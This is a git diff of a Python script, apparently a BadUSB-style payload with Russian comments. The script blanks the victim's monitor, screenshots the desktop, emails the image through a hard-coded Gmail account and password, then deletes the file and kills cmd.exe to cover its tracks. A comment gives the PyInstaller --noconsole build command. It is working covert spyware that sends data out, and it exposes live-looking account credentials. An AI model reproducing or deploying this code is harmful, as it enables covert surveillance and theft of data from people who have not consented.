@@ -7,19 +7,29 @@ import smtplib # библиотека Для отправки сообщений
 import pyscreenshot
 import mouse
 
+from PIL import ImageGrab
+
 from email.mime.text import MIMEText # библиотека которая облегчает отправку сообщений (вместо большого кода всего 4 строки)
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
-
+print("start")
 def ScreenOFF():
     return win32api.PostMessage(win32con.HWND_BROADCAST,win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
+def ScreenON():
+    return win32api.SendMessage(win32con.HWND_BROADCAST,win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, -1)
 ScreenOFF()
 fileName = "GeeksforGeeks.png"
-pathToFile = f"C:/Users/admin/{fileName}"
-if(os.path.exists(pathToFile)):
-    os.remove(pathToFile)
-image = pyscreenshot.grab()
-image.save(fileName)
+pathToFile = f"C:/Badusb/{fileName}"
+if (os.path.exists("C:/Badusb")):
+    print("dir exist")
+    if(os.path.exists(pathToFile)):
+        os.remove(pathToFile)
+else:
+    print("dir not exist")
+    os.makedirs("C:/Badusb")
+imageNEW = ImageGrab.grab()
+imageNEW.save(pathToFile)
+print("success save file")
 SMTPmail = smtplib.SMTP('smtp.gmail.com', 587) # обращаемся к серверам гугл
 SMTPmail.starttls() # проверка подключения
 SMTPmail.login('weatherforaday@gmail.com','vxoh qcqd vqaw zbws') # вход в заранее заготовленный аккаунт
@@ -30,10 +40,13 @@ Message = MIMEMultipart() # вспомогающий метод, для созд
 Message['Subject'] = listOfEmails[0] # Заголовок письма
 Message['From'] = 'weatherforaday@gmail.com'  # отправитель
 Message['To'] = listOfEmails[0] # получатель
-part = MIMEApplication(open(fileName, 'rb').read())
-part.add_header('Content-Disposition', 'attachment', filename=fileName)
+part = MIMEApplication(open(pathToFile, 'rb').read())
+part.add_header('Content-Disposition', 'attachment', filename=pathToFile)
 Message.attach(part)
 SMTPmail.sendmail("weatherforaday@gmail.com", listOfEmails[0], Message.as_string()) # отправляем его
-#print(f"{listOfEmails[0]} is writing!") # выводим в командную строку питона, чтобы показать что код получил письмо и обработал его
-mouse.drag(0, 0, 0, 1, absolute=False, duration=0.5)
+#mouse.drag(0, 0, 0, 1, absolute=False, duration=0.5)
 os.system("taskkill /im cmd.exe")
+os.remove(pathToFile)
+time.sleep(5)
+ScreenON()
+#python -m PyInstaller --noconsole --hidden-import 'package_name' --onefile 'MailSender.py'
